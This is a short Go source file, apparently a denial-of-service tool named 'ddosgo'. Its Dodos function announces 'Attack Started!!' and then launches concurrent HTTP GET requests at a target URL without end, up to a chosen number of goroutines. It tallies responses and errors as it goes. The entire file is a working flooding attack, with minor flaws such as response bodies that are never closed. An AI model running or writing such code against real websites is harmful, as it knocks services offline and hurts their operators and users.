package ddosgo

import (
  "net/http"
  "log"
  "time"
  "sync"

  "runtime"
)

var (
  Totalrequest = new(int)
  Totalresponse = new(int)
  Totalbounced = new(int)
  URL = new(string)
  Errors map[string]int
  Responses map[int]int
  rwm     sync.RWMutex
)

func setError(key string) {
	rwm.Lock()
	defer rwm.Unlock()
	Errors[key]+=1
}

func setResponse(key int)  {
  rwm.Lock()
  defer rwm.Unlock()
  Responses[key]+=1
}

func incrCounter(num *int)  {
  rwm.Lock()
  defer rwm.Unlock()
  *num+=1
}

func Dodos(url string,nuo int)  {
  Errors = make(map[string]int)
  Responses = make(map[int]int)
  *URL = url
  var wg sync.WaitGroup
  log.Print("Attack Started!!")
  for {
    if(runtime.NumGoroutine()>nuo){
    }else{
      go func ()  {
        wg.Add(1)
        incrCounter(Totalrequest)
        resp, err := http.Get(url)
        if err != nil {
          incrCounter(Totalbounced)
          setError(string(err.Error()))
        }else{
          incrCounter(Totalresponse)
          setResponse(resp.StatusCode)
        }
        wg.Done()
      }()
      time.Sleep(10*time.Millisecond)
    }
  }
  wg.Wait()
}
